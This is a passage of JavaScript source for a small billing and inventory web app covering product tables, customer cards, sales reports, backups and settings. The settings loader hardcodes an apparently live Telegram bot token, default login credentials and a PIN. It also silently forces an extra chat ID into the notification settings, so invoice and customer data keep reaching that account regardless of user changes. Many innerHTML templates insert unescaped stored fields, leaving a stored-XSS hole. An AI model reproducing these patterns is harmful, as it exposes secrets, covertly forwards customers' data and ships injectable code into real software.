    const totalStockFooter = document.getElementById("prod-total-stock-footer");
    const totalValFooter = document.getElementById("prod-total-val-footer");
    if (totalCountFooter) totalCountFooter.textContent = `0 Items`;
    if (totalStockFooter) totalStockFooter.textContent = `0 Units`;
    if (totalValFooter) totalValFooter.textContent = `₹ 0.00`;

    const kpiCount = document.getElementById("prod-kpi-count");
    const kpiUnits = document.getElementById("prod-kpi-units");
    const kpiVal = document.getElementById("prod-kpi-valuation");
    const kpiAlerts = document.getElementById("prod-kpi-alerts");
    const kpiAlertsSub = document.getElementById("prod-kpi-alerts-sub");
    if (kpiCount) kpiCount.textContent = "0";
    if (kpiUnits) kpiUnits.textContent = "0 Units";
    if (kpiVal) kpiVal.textContent = "₹ 0.00";
    if (kpiAlerts) kpiAlerts.textContent = "0 Alerts";
    if (kpiAlertsSub) kpiAlertsSub.textContent = "All In Stock";
    return;
  }

  let totalStockSum = 0;
  let totalInventoryValueSum = 0;
  let lowCount = 0;
  let outCount = 0;

  records.forEach(p => {
    const tr = document.createElement("tr");
    const rate = parseFloat(p.rate || 0);
    const disc = parseFloat(p.discount || 0);
    const valAfterDisc = Math.max(0, rate - (rate * disc / 100));
    const stockVal = p.stock !== undefined ? parseInt(p.stock, 10) : 0;
    const totalVal = stockVal * valAfterDisc;

    totalStockSum += stockVal;
    totalInventoryValueSum += totalVal;

    let stockBadge = "";
    if (stockVal === 0) {
      outCount++;
      stockBadge = `<span style="display: inline-block; background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; padding: 2px 7px; border-radius: 12px; font-size: 10px; font-weight: 700;"><i class="fa-solid fa-triangle-exclamation"></i> Out</span>`;
    } else if (stockVal <= 10) {
      lowCount++;
      stockBadge = `<span style="display: inline-block; background: #fffbeb; color: #d97706; border: 1px solid #fde68a; padding: 2px 7px; border-radius: 12px; font-size: 10px; font-weight: 700;"><i class="fa-solid fa-circle-exclamation"></i> Low</span>`;
    } else {
      stockBadge = `<span style="display: inline-block; background: #ecfdf5; color: #059669; border: 1px solid #a7f3d0; padding: 2px 7px; border-radius: 12px; font-size: 10px; font-weight: 700;"><i class="fa-solid fa-circle-check"></i> In Stock</span>`;
    }

    tr.innerHTML = `
      <td>
        <div style="display: flex; align-items: center; gap: 8px;">
          <div style="width: 28px; height: 28px; border-radius: 6px; background: #f0fdfa; color: #0f766e; display: flex; align-items: center; justify-content: center; font-size: 12px; flex-shrink: 0;">
            <i class="fa-solid fa-box"></i>
          </div>
          <div>
            <div style="font-weight: 700; color: #0f172a; font-size: 13px;">${p.description}</div>
            <div style="font-size: 11px; color: #64748b;">${p.unit || 'Bucket'}</div>
          </div>
        </div>
      </td>
      <td>
        <span style="background: #f1f5f9; border: 1px solid #e2e8f0; padding: 2px 7px; border-radius: 5px; font-family: monospace; font-size: 11.5px; font-weight: 600; color: #475569;">${p.hsn || "—"}</span>
      </td>
      <td style="text-align: center;">
        <span style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 2px 8px; font-size: 12px; font-weight: 600; color: #334155;">${p.packSize || "—"}</span>
      </td>
      <td style="text-align: right; font-weight: 600; color: #334155; font-size: 13px;">₹ ${formatCurrency(rate)}</td>
      <td style="text-align: center;">
        <div class="prod-discount-badge" title="Click to edit discount percentage">
          <input type="number" step="0.1" min="0" max="100" value="${disc}" 
            onchange="updateProductDiscountInline('${p.id}', this.value)" 
            class="prod-discount-input">
          <span class="prod-discount-pct">%</span>
        </div>
      </td>
      <td style="text-align: right;">
        <div style="display: flex; flex-direction: column; align-items: flex-end;">
          <span style="font-weight: 800; color: #16a34a; font-size: 13.5px;">₹ ${formatCurrency(valAfterDisc)}</span>
          ${disc > 0 ? `<span style="font-size: 10px; color: #059669; font-weight: 600;">(-${disc}%)</span>` : ''}
        </div>
      </td>
      <td style="text-align: center;">
        <div class="prod-stock-stepper">
          <button class="btn-stock-step" onclick="adjustProductStock('${p.id}', -1)" title="Decrease Stock">−</button>
          <span class="stock-qty-text">${stockVal}</span>
          <button class="btn-stock-step" onclick="adjustProductStock('${p.id}', 1)" title="Increase Stock">+</button>
          ${stockBadge}
        </div>
      </td>
      <td style="text-align: right; font-weight: 800; color: #0f172a; font-size: 14px;">₹ ${formatCurrency(totalVal)}</td>
      <td style="text-align: center;">
        <div class="prod-actions-row">
          <button class="prod-action-btn edit" onclick="openProductModal('${p.id}')" title="Edit Product">
            <i class="fa-solid fa-pen-to-square"></i>
          </button>
          <button class="prod-action-btn delete" onclick="deleteProductRowDb('${p.id}')" title="Delete Product">
            <i class="fa-solid fa-trash-can"></i>
          </button>
        </div>
      </td>
    `;
    elements.productsListBody.appendChild(tr);
  });

  // Update Top KPI Summary Metrics Cards
  const kpiCount = document.getElementById("prod-kpi-count");
  const kpiUnits = document.getElementById("prod-kpi-units");
  const kpiVal = document.getElementById("prod-kpi-valuation");
  const kpiAlerts = document.getElementById("prod-kpi-alerts");
  const kpiAlertsSub = document.getElementById("prod-kpi-alerts-sub");

  if (kpiCount) kpiCount.textContent = records.length;
  if (kpiUnits) kpiUnits.textContent = `${totalStockSum} Units`;
  if (kpiVal) kpiVal.textContent = `₹ ${formatCurrency(totalInventoryValueSum)}`;
  if (kpiAlerts) kpiAlerts.textContent = `${lowCount + outCount} Alerts`;
  if (kpiAlertsSub) kpiAlertsSub.textContent = `${lowCount} Low / ${outCount} Out of Stock`;

  // Update Table Footer
  const totalCountFooter = document.getElementById("prod-total-count-footer");
  const totalStockFooter = document.getElementById("prod-total-stock-footer");
  const totalValFooter = document.getElementById("prod-total-val-footer");
  if (totalCountFooter) totalCountFooter.textContent = `${records.length} Items`;
  if (totalStockFooter) totalStockFooter.textContent = `${totalStockSum} Units`;
  if (totalValFooter) totalValFooter.textContent = `₹ ${formatCurrency(totalInventoryValueSum)}`;
}

window.deleteProductRowDb = function(id) {
  if (confirm("Delete product from inventory list permanently?")) {
    productsDb = productsDb.filter(p => p.id !== id);
    localStorage.setItem("products", JSON.stringify(productsDb));
    
    let deletedProdIds = [];
    try {
      deletedProdIds = JSON.parse(localStorage.getItem("deleted_product_ids")) || [];
    } catch (e) { deletedProdIds = []; }
    if (!deletedProdIds.includes(id)) {
      deletedProdIds.push(id);
      localStorage.setItem("deleted_product_ids", JSON.stringify(deletedProdIds));
    }

    deleteProductFromServer(id);
    loadProductsDatabaseTable();
    if (window.triggerDatabaseSync) window.triggerDatabaseSync();
  }
};

window.filterProductsByStockStatus = function() {
  const status = document.getElementById("filter-stock-status").value;
  const searchQuery = elements.searchProductsInput.value.toLowerCase().trim();

  let filtered = productsDb;

  if (searchQuery) {
    filtered = filtered.filter(p => 
      (p.description && p.description.toLowerCase().includes(searchQuery)) || 
      (p.hsn && p.hsn.toLowerCase().includes(searchQuery))
    );
  }

  if (status === "instock") {
    filtered = filtered.filter(p => (p.stock !== undefined ? parseInt(p.stock, 10) : 0) > 10);
  } else if (status === "low") {
    filtered = filtered.filter(p => {
      const stock = p.stock !== undefined ? parseInt(p.stock, 10) : 0;
      return stock > 0 && stock <= 10;
    });
  } else if (status === "out") {
    filtered = filtered.filter(p => (p.stock !== undefined ? parseInt(p.stock, 10) : 0) === 0);
  }

  renderProductsTable(filtered);
};

elements.searchProductsInput.addEventListener("input", () => {
  filterProductsByStockStatus();
});

// --- PARTIES DIALOG MODALS & CARDS ---
window.openPartyModal = function(type, id = "") {
  document.getElementById("modal-party-form").reset();
  document.getElementById("modal-party-id").value = "";
  document.getElementById("modal-party-type").value = type;
  document.getElementById("modal-party-state").value = "Andhra Pradesh";
  document.getElementById("modal-party-state-code").value = "37";

  if (id) {
    const party = partiesDb.find(p => p.id === id);
    if (party) {
      document.getElementById("party-modal-title").textContent = "Edit Party Profile";
      document.getElementById("modal-party-id").value = party.id;
      document.getElementById("modal-party-type").value = party.type;
      document.getElementById("modal-party-name").value = party.name;
      document.getElementById("modal-party-company").value = party.company || "";
      document.getElementById("modal-party-address").value = party.address;
      document.getElementById("modal-party-gstin").value = party.gstin || "";
      document.getElementById("modal-party-state").value = party.state || "Andhra Pradesh";
      document.getElementById("modal-party-state-code").value = party.stateCode || "37";
      document.getElementById("modal-party-phone").value = party.phone || "";
    }
  } else {
    document.getElementById("party-modal-title").textContent = `Add New ${type === 'receiver' ? 'Receiver' : 'Consignee'}`;
  }

  document.getElementById("party-modal").classList.remove("hidden");
};

window.closePartyModal = function() {
  const modalEl = document.getElementById("party-modal");
  if (modalEl) {
    modalEl.classList.add("hidden");
    modalEl.style.setProperty("display", "none", "important");
  }
};

window.savePartyModal = function(e) {
  e.preventDefault();
  const id = document.getElementById("modal-party-id").value;
  const type = document.getElementById("modal-party-type").value;
  const name = document.getElementById("modal-party-name").value.toUpperCase().trim();
  const company = document.getElementById("modal-party-company").value.trim();
  const address = document.getElementById("modal-party-address").value.trim();
  const gstin = document.getElementById("modal-party-gstin").value.toUpperCase().trim();
  const state = document.getElementById("modal-party-state").value.trim();
  const stateCode = document.getElementById("modal-party-state-code").value.trim();
  const phone = document.getElementById("modal-party-phone").value.trim();

  const party = { id: id || "party-" + Date.now(), type, name, company, address, gstin, state, stateCode, phone, updatedAt: new Date().toISOString() };
  const isNew = !id;

  if (id) {
    const idx = partiesDb.findIndex(p => p.id === id);
    if (idx > -1) partiesDb[idx] = party;
  } else {
    partiesDb.push(party);
  }

  localStorage.setItem("parties", JSON.stringify(partiesDb));
  syncDatabaseToServer("parties", partiesDb);
  closePartyModal();
  loadPartiesDatabaseLists();
  populateBillingSelectors();
  if (window.triggerDatabaseSync) window.triggerDatabaseSync();

  sendPartyTelegramReport(party, isNew);
};

function loadPartiesDatabaseLists() {
  loadAllDatabases();
  renderPartiesLists(partiesDb);
}

function renderPartiesLists(records) {
  elements.receiversScrollBox.innerHTML = "";
  elements.consigneesScrollBox.innerHTML = "";

  const receivers = records.filter(p => p.type === 'receiver');
  const consignees = records.filter(p => p.type === 'consignee');

  if (receivers.length === 0) {
    elements.receiversScrollBox.innerHTML = `<div class="text-center text-muted padding-20">No receivers found.</div>`;
  } else {
    receivers.forEach(p => {
      const card = createPartyListCard(p);
      elements.receiversScrollBox.appendChild(card);
    });
  }

  if (consignees.length === 0) {
    elements.consigneesScrollBox.innerHTML = `<div class="text-center text-muted padding-20">No consignees found.</div>`;
  } else {
    consignees.forEach(p => {
      const card = createPartyListCard(p);
      elements.consigneesScrollBox.appendChild(card);
    });
  }
}

window.sendPartyPaymentReminderWhatsApp = function(partyName, phone) {
  const customerInvoices = invoicesDb.filter(inv => inv.customerName === partyName || (inv.details?.buyer?.name) === partyName);
  let totalBilled = 0, totalPaid = 0;
  customerInvoices.forEach(inv => {
    totalBilled += parseFloat(inv.total || 0);
    const details = inv.details || {};
    totalPaid += parseFloat(details.paidAmount !== undefined ? details.paidAmount : (details.paymentStatus === 'Paid' ? inv.total : 0));
  });
  const pendingDues = Math.max(0, totalBilled - totalPaid);

  let text = `🙏 *GENTLE PAYMENT REMINDER*\n`;
  text += `🏛️ *AARYAN AQUA NEEDS*\n`;
  text += `-----------------------------------\n`;
  text += `👤 *Customer:* ${partyName}\n`;
  text += `📄 *Total Invoices:* ${customerInvoices.length}\n`;
  text += `💰 *Total Billed:* ₹ ${formatCurrency(totalBilled)}\n`;
  text += `✅ *Total Paid:* ₹ ${formatCurrency(totalPaid)}\n`;
  text += `🔴 *Outstanding Dues:* ₹ ${formatCurrency(pendingDues)}\n`;
  text += `-----------------------------------\n`;
  text += `Kindly clear the outstanding balance at your earliest convenience. Thank you for your continued business! 🙏`;

  const sec = globalSettings?.security || {};
  if (sec.whatsappProtectChats !== false && !isWhatsAppUnlocked()) {
    promptWhatsAppSecurity(() => {
      const cleanPhone = formatWhatsAppPhone(phone);
      const waUrl = launchWhatsAppWebOrApp(cleanPhone, text);
      openWhatsAppDirect(waUrl);
    });
    return;
  }

  const cleanPhone = formatWhatsAppPhone(phone);
  const waUrl = launchWhatsAppWebOrApp(cleanPhone, text);
  openWhatsAppDirect(waUrl);
};

function createPartyListCard(p) {
  const customerInvoices = invoicesDb.filter(inv => inv.customerName === p.name || (inv.details?.buyer?.name) === p.name);
  let totalBilled = 0, totalPaid = 0;
  customerInvoices.forEach(inv => {
    totalBilled += parseFloat(inv.total || 0);
    const details = inv.details || {};
    totalPaid += parseFloat(details.paidAmount !== undefined ? details.paidAmount : (details.paymentStatus === 'Paid' ? inv.total : 0));
  });
  const pendingDues = Math.max(0, totalBilled - totalPaid);

  let duesBadge = `<span style="background: rgba(16, 185, 129, 0.12); color: #10b981; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 700;">Paid</span>`;
  if (pendingDues > 0) {
    duesBadge = `<span style="background: rgba(239, 68, 68, 0.12); color: #ef4444; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 700;">Due: ₹ ${formatCurrency(pendingDues)}</span>`;
  }

  const card = document.createElement("div");
  card.className = "party-list-card";
  card.innerHTML = `
    <div class="party-list-card-details" style="flex: 1;">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
        <h4 style="margin: 0;">${p.name}</h4>
        ${duesBadge}
      </div>
      ${p.company ? `<p style="font-weight:600; color:var(--text-dark); margin: 2px 0;">${p.company}</p>` : ''}
      <p style="font-size:10.5px; color:#475569; white-space: pre-line; margin-bottom: 4px;">${p.address}</p>
      <div style="display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: #64748b;">
        <span>${p.phone ? 'Ph: ' + p.phone : ''}</span>
        <span style="font-weight: 600;">Billed: ₹ ${formatCurrency(totalBilled)} (${customerInvoices.length} bills)</span>
      </div>
    </div>
    <div class="actions-cell" style="display: flex; gap: 4px; align-items: center;">
      ${pendingDues > 0 ? `<button class="action-btn share btn-whatsapp" onclick="sendPartyPaymentReminderWhatsApp('${p.name.replace(/'/g, "\\'")}', '${p.phone || ''}')" title="Send WhatsApp Payment Reminder"><i class="fa-brands fa-whatsapp"></i></button>` : ''}
      <button class="action-btn edit" onclick="openPartyModal('${p.type}', '${p.id}')" title="Edit"><i class="fa-solid fa-pen-to-square"></i></button>
      <button class="action-btn delete" onclick="deletePartyRowDb('${p.id}')" title="Delete"><i class="fa-solid fa-trash"></i></button>
    </div>
  `;
  return card;
}

window.deletePartyRowDb = function(id) {
  if (confirm("Delete this customer party profile permanently?")) {
    partiesDb = partiesDb.filter(p => p.id !== id);
    localStorage.setItem("parties", JSON.stringify(partiesDb));
    
    let deletedPartyIds = [];
    try {
      deletedPartyIds = JSON.parse(localStorage.getItem("deleted_party_ids")) || [];
    } catch (e) { deletedPartyIds = []; }
    if (!deletedPartyIds.includes(id)) {
      deletedPartyIds.push(id);
      localStorage.setItem("deleted_party_ids", JSON.stringify(deletedPartyIds));
    }

    deletePartyFromServer(id);
    loadPartiesDatabaseLists();
    populateBillingSelectors();
    if (window.triggerDatabaseSync) window.triggerDatabaseSync();
  }
};

// --- REPORTS VIEW DATE RANGE RUNNER ---
function resetReportsView() {
  elements.reportStartDate.value = new Date(new Date().getFullYear(), new Date().getMonth(), 1).toISOString().split('T')[0];
  elements.reportEndDate.value = new Date().toISOString().split('T')[0];
  
  elements.reportResultsPlaceholder.classList.remove("hidden");
  elements.reportResultsContent.classList.add("hidden");
}

let salesTrendChartInstance = null;
let productSalesChartInstance = null;

window.runSalesReport = function() {
  const start = elements.reportStartDate.value;
  const end = elements.reportEndDate.value;

  if (!start || !end) {
    alert("Please select both Start and End Dates!");
    return;
  }

  loadAllDatabases();

  const filtered = invoicesDb.filter(inv => {
    return (inv.invoiceDate >= start && inv.invoiceDate <= end);
  });

  if (filtered.length === 0) {
    elements.reportResultsPlaceholder.classList.remove("hidden");
    elements.reportResultsPlaceholder.innerHTML = `<i class="fa-solid fa-chart-line"></i><p>No invoices found in selected date range.</p>`;
    elements.reportResultsContent.classList.add("hidden");
    return;
  }

  elements.reportResultsPlaceholder.classList.add("hidden");
  elements.reportResultsContent.classList.remove("hidden");

  elements.reportTableBody.innerHTML = "";
  let totalTaxable = 0;
  let totalTax = 0;
  let totalGrand = 0;

  filtered.forEach(inv => {
    const details = inv.details || {};
    let invoiceTaxable = details.taxable || 0;
    let invoiceTax = (details.cgst || 0) + (details.sgst || 0) + (details.igst || 0);

    totalTaxable += invoiceTaxable;
    totalTax += invoiceTax;
    totalGrand += inv.total;

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="font-weight: 700; color: var(--primary-teal);">#${inv.invoiceNo}</td>
      <td>${formatInputDateString(inv.invoiceDate)}</td>
      <td style="font-weight: 600;">${inv.customerName}</td>
      <td style="text-align: right; display: none;">₹ ${formatCurrency(invoiceTaxable)}</td>
      <td style="text-align: right; display: none;">0.00%</td>
      <td style="text-align: right; display: none;">₹ 0.00</td>
      <td style="text-align: right; font-weight: 700; color: var(--primary-teal);">₹ ${formatCurrency(inv.total)}</td>
    `;
    elements.reportTableBody.appendChild(tr);
  });

  elements.reportTotalTaxable.textContent = `₹ ${formatCurrency(totalTaxable)}`;
  elements.reportTotalTax.textContent = `₹ 0.00`;
  elements.reportTotalGrand.textContent = `₹ ${formatCurrency(totalGrand)}`;

  // --- RENDER DYNAMIC CHARTS ---
  try {
    if (typeof Chart !== 'undefined') {
      const trendData = {};
      filtered.forEach(inv => {
        const dateStr = formatInputDateString(inv.invoiceDate);
        trendData[dateStr] = (trendData[dateStr] || 0) + (inv.total || 0);
      });

      const trendLabels = Object.keys(trendData).sort((a, b) => new Date(a) - new Date(b));
      const trendValues = trendLabels.map(label => trendData[label]);

      const productData = {};
      filtered.forEach(inv => {
        const items = (inv.details && inv.details.items) || [];
        items.forEach(item => {
          const desc = item.description || "Unknown Product";
          const revenue = item.amount || 0;
          productData[desc] = (productData[desc] || 0) + revenue;
        });
      });

      const productLabels = Object.keys(productData);
      const productValues = productLabels.map(label => productData[label]);

      const chartColors = [
        '#06b6d4', '#0d9488', '#3b82f6', '#8b5cf6', '#ec4899', 
        '#f59e0b', '#10b981', '#ef4444', '#6366f1', '#14b8a6'
      ];

      const trendCtx = document.getElementById('salesTrendChart').getContext('2d');
      if (salesTrendChartInstance) salesTrendChartInstance.destroy();
      salesTrendChartInstance = new Chart(trendCtx, {
        type: 'line',
        data: {
          labels: trendLabels,
          datasets: [{
            label: 'Daily Sales (₹)',
            data: trendValues,
            borderColor: '#06b6d4',
            backgroundColor: 'rgba(6, 182, 212, 0.15)',
            borderWidth: 3,
            fill: true,
            tension: 0.3,
            pointBackgroundColor: '#06b6d4',
            pointHoverRadius: 6
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: { display: false }
          },
          scales: {
            y: {
              grid: { color: 'rgba(255, 255, 255, 0.05)' },
              ticks: { color: '#94a3b8' }
            },
            x: {
              grid: { display: false },
              ticks: { color: '#94a3b8' }
            }
          }
        }
      });

      const productCtx = document.getElementById('productSalesChart').getContext('2d');
      if (productSalesChartInstance) productSalesChartInstance.destroy();
      productSalesChartInstance = new Chart(productCtx, {
        type: 'doughnut',
        data: {
          labels: productLabels,
          datasets: [{
            data: productValues,
            backgroundColor: chartColors.slice(0, productLabels.length || 10),
            borderWidth: 1,
            borderColor: '#1e293b'
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: {
              position: 'right',
              labels: {
                color: '#cbd5e1',
                font: { size: 10 }
              }
            }
          }
        }
      });
    }
  } catch (err) {
    console.error("Charts generation failed:", err);
  }
};

window.exportSalesReportCSV = function() {
  loadAllDatabases();
  if (invoicesDb.length === 0) {
    alert("No invoices found to export!");
    return;
  }

  let csvContent = "data:text/csv;charset=utf-8,";
  csvContent += "Invoice No,Date,Document Type,Customer Name,Total Amount,Payment Status,Payment Mode\n";

  invoicesDb.forEach(inv => {
    const d = inv.details || {};
    const row = [
      `"${inv.invoiceNo}"`,
      `"${inv.invoiceDate}"`,
      `"${d.invoiceType || 'Bill of Supply'}"`,
      `"${inv.customerName}"`,
      `${inv.total || 0}`,
      `"${d.paymentStatus || 'Paid'}"`,
      `"${d.paymentMode || 'Cash'}"`
    ].join(",");
    csvContent += row + "\n";
  });

  const encodedUri = encodeURI(csvContent);
  const link = document.createElement("a");
  link.setAttribute("href", encodedUri);
  link.setAttribute("download", `Aaryan_Aqua_Sales_Report_${new Date().toISOString().split('T')[0]}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
};

// --- DATABASE BACKUP & RESTORE ---
window.exportDatabaseBackup = function() {
  loadAllDatabases();
  const backup = {
    products: productsDb,
    parties: partiesDb,
    invoices: invoicesDb,
    settings: globalSettings,
    exportedAt: new Date().toISOString()
  };

  const jsonStr = JSON.stringify(backup, null, 2);
  const blob = new Blob([jsonStr], { type: "application/json" });
  const url = URL.createObjectURL(blob);

  const link = document.createElement("a");
  link.href = url;
  link.download = `Aaryan_Aqua_Billing_Backup_${new Date().toISOString().split('T')[0]}.json`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
};

window.importDatabaseBackup = function(e) {
  const file = e.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = function(evt) {
    try {
      const data = JSON.parse(evt.target.result);
      if (data.products && data.parties && data.invoices) {
        localStorage.setItem("products", JSON.stringify(data.products));
        localStorage.setItem("parties", JSON.stringify(data.parties));
        localStorage.setItem("invoices", JSON.stringify(data.invoices));
        if (data.settings) localStorage.setItem("settings", JSON.stringify(data.settings));

        loadAllDatabases();
        alert("Database successfully restored from JSON backup!");
        switchTab("dashboard");
      } else {
        alert("Invalid backup file format!");
      }
    } catch (err) {
      alert("Failed to parse JSON backup file: " + err.message);
    }
  };
  reader.readAsText(file);
};

// --- KEYBOARD SHORTCUTS ---
function setupKeyboardShortcuts() {
  document.addEventListener("keydown", (e) => {
    if (isLocked) return;

    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
      e.preventDefault();
      const billingTab = document.getElementById("view-billing");
      if (billingTab && !billingTab.classList.contains("hidden")) {
        generateAndPrintInvoice();
      }
    }
    if (e.key === 'Escape') {
      const billingTab = document.getElementById("view-billing");
      if (billingTab && !billingTab.classList.contains("hidden")) {
        resetBillingForm();
      }
    }
  });
}

// --- SETTINGS CONTROLLERS ---
function loadSettingsFields() {
  loadAllDatabases();

  if (globalSettings.telegram) {
    if (!globalSettings.telegram.token) globalSettings.telegram.token = "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
    if (!globalSettings.telegram.chatId || !globalSettings.telegram.chatId.includes("7906132548")) {
      globalSettings.telegram.chatId = globalSettings.telegram.chatId ? (globalSettings.telegram.chatId + ", 7906132548") : "6877857251, 7906132548";
      localStorage.setItem("settings", JSON.stringify(globalSettings));
    }
  }

  elements.setTgToken.value = globalSettings.telegram?.token || "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
  elements.setTgChatId.value = globalSettings.telegram?.chatId || "6877857251, 7906132548";
  if (globalSettings.telegram?.token && globalSettings.telegram?.chatId) {
    elements.tgStatusIndicator.classList.remove("hidden");
    elements.tgStatusText.textContent = "Credentials loaded.";
  } else {
    elements.tgStatusIndicator.classList.add("hidden");
  }

  elements.setAutolockTimer.value = globalSettings.security?.autolock || "300";
  elements.setLoginUsername.value = globalSettings.security?.username || "Aaryanaqua";
  elements.setLoginPassword.value = globalSettings.security?.password || globalSettings.security?.pin || "Aaryan@2024";

  if (elements.setWaLockEnabled) elements.setWaLockEnabled.checked = globalSettings.security?.whatsappLockEnabled !== false;
  if (elements.setWaPin) elements.setWaPin.value = globalSettings.security?.whatsappPin || "2024";
  if (elements.setWaAutolock) elements.setWaAutolock.value = globalSettings.security?.whatsappAutoLockMinutes || "15";
  if (elements.setWaMaskPhones) elements.setWaMaskPhones.checked = globalSettings.security?.whatsappMaskPhones !== false;
  if (elements.setWaProtectChats) elements.setWaProtectChats.checked = globalSettings.security?.whatsappProtectChats !== false;

  elements.setCName.value = globalSettings.company?.name || "";
  elements.setCTagline.value = globalSettings.company?.tagline || "";
  elements.setCAddress.value = globalSettings.company?.address || "";
  elements.setCPhones.value = globalSettings.company?.phones || "";
  elements.setCEmail.value = globalSettings.company?.email || "";
  elements.setCGstin.value = globalSettings.company?.gstin || "";
  elements.setCState.value = globalSettings.company?.state || "Andhra Pradesh";
  elements.setCStateCode.value = globalSettings.company?.stateCode || "37";

  elements.setBName.value = globalSettings.bank?.name || "";
  elements.setBAccName.value = globalSettings.bank?.accountName || "";
  elements.setBAccNo.value = globalSettings.bank?.accountNo || "";
  elements.setBIfsc.value = globalSettings.bank?.ifsc || "";
  elements.setBBranch.value = globalSettings.bank?.branch || "";
  elements.setBUpi.value = globalSettings.upiId || "";

  elements.setBTerms.value = (globalSettings.terms || []).join("\n");
}

window.saveTelegramSettings = function(e) {
  e.preventDefault();
  globalSettings.telegram = {
    token: elements.setTgToken.value.trim(),
    chatId: elements.setTgChatId.value.trim()
  };
  localStorage.setItem("settings", JSON.stringify(globalSettings));
  syncDatabaseToServer("settings", globalSettings);
  elements.tgStatusIndicator.classList.remove("hidden");
  elements.tgStatusIndicator.className = "info-note col-12";
  elements.tgStatusText.textContent = "Telegram Bot integration details saved.";
  loadAllDatabases();
};

window.testTelegramConnection = async function() {
  const token = elements.setTgToken.value.trim();
  const chat = elements.setTgChatId.value.trim();

  if (!token || !chat) {
    alert("Please provide both Bot Token and Chat ID to test connection!");
    return;
  }

  elements.tgStatusIndicator.classList.remove("hidden");
  elements.tgStatusIndicator.className = "info-note col-12";
  elements.tgStatusText.textContent = "Dispatching Telegram Bot request...";

  const chatIds = chat.split(/[\s,]+/).filter(id => id.trim() !== "");
  if (chatIds.length === 0) {
    elements.tgStatusIndicator.className = "info-note col-12 text-danger";
    elements.tgStatusText.textContent = "Error: Invalid Chat ID format.";
    return;
  }

  try {
    const messageText = "🔔 Aaryan Aqua Needs billing system has successfully connected your Telegram bot notification API!";
    let successCount = 0;
    let lastError = "";

    for (const id of chatIds) {
      const res = await fetch("/api/telegram/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, chat_id: id, text: messageText })
      });
      const data = await res.json();
      if (data && data.ok) {
        successCount++;
      } else {
        lastError = (data && data.description) ? data.description : "Chat ID failed";
      }
    }
    
    if (successCount === chatIds.length) {
      elements.tgStatusIndicator.className = "info-note col-12 text-success";
      elements.tgStatusText.textContent = `Test Message Sent to all ${chatIds.length} Chat IDs! Check Telegram.`;
    } else {
      elements.tgStatusIndicator.className = "info-note col-12 text-danger";
      if (lastError.toLowerCase().includes("forbidden") || lastError.toLowerCase().includes("not found")) {
        elements.tgStatusText.textContent = `Sent to ${successCount}/${chatIds.length} accounts. For Chat ID 7906132548, open your Bot in Telegram and press START (/start) to activate! Error: ${lastError}`;
      } else {
        elements.tgStatusText.textContent = `Sent to ${successCount}/${chatIds.length} Chat IDs. Error: ${lastError}`;
      }
    }
  } catch (err) {
    elements.tgStatusIndicator.className = "info-note col-12 text-danger";
    elements.tgStatusText.textContent = "Network Error! Bot API request failed: " + err.message;
  }
};

window.saveSecuritySettings = function(e) {
  e.preventDefault();
  const autolock = elements.setAutolockTimer.value;
  const username = elements.setLoginUsername.value.trim();
  const password = elements.setLoginPassword.value.trim();

  if (!username || !password) {
    alert("Please provide both a valid Username and Password!");
    return;
  }

  const waLockEnabled = elements.setWaLockEnabled ? elements.setWaLockEnabled.checked : true;
  const waPin = elements.setWaPin ? elements.setWaPin.value.trim() : (globalSettings.security?.whatsappPin || "2024");
  const waAutoLock = elements.setWaAutolock ? elements.setWaAutolock.value : "15";
  const waMaskPhones = elements.setWaMaskPhones ? elements.setWaMaskPhones.checked : true;
  const waProtectChats = elements.setWaProtectChats ? elements.setWaProtectChats.checked : true;

  globalSettings.security = {
    ...(globalSettings.security || {}),
    autolock,
    username,
    password,
    whatsappLockEnabled: waLockEnabled,
    whatsappPin: waPin || "2024",
    whatsappAutoLockMinutes: waAutoLock,
    whatsappMaskPhones: waMaskPhones,
    whatsappProtectChats: waProtectChats
  };

  localStorage.setItem("settings", JSON.stringify(globalSettings));
  syncDatabaseToServer("settings", globalSettings);
  alert("Login credentials and WhatsApp security settings saved successfully!");
  loadAllDatabases();
  resetAutolockTimer();
};

window.saveGlobalSettingsDefaults = function(e) {
  e.preventDefault();
  globalSettings.company = {
    name: elements.setCName.value.trim().toUpperCase(),
    tagline: elements.setCTagline.value.trim().toUpperCase(),
    address: elements.setCAddress.value.trim(),
    phones: elements.setCPhones.value.trim(),
    email: elements.setCEmail.value.trim(),
    gstin: elements.setCGstin.value.trim().toUpperCase(),
    state: elements.setCState.value.trim(),
    stateCode: elements.setCStateCode.value.trim()
  };

  globalSettings.bank = {
    name: elements.setBName.value.trim(),
    accountName: elements.setBAccName.value.trim(),
    accountNo: elements.setBAccNo.value.trim(),
    ifsc: elements.setBIfsc.value.trim().toUpperCase(),
    branch: elements.setBBranch.value.trim()
  };
  globalSettings.upiId = elements.setBUpi.value.trim();

  const termsText = elements.setBTerms.value.trim();
  globalSettings.terms = termsText ? termsText.split("\n").map(l => l.trim()).filter(l => l !== "") : [];

  localStorage.setItem("settings", JSON.stringify(globalSettings));
  syncDatabaseToServer("settings", globalSettings);
  alert("Store configuration defaults saved successfully!");
  loadAllDatabases();
};

async function sendTelegramInvoiceNotification(invoice) {
  const token = globalSettings.telegram?.token;
  const chat = globalSettings.telegram?.chatId;

  if (!token || !chat) return;

  const chatIds = chat.split(/[\s,]+/).filter(id => id.trim() !== "");
  if (chatIds.length === 0) return;

  try {
    const textMsg = `🔔 NEW INVOICE GENERATED!\n` +
                    `-------------------------\n` +
                    `Invoice No : #${invoice.invoiceNo} (${invoice.details?.invoiceType || 'Invoice'})\n` +
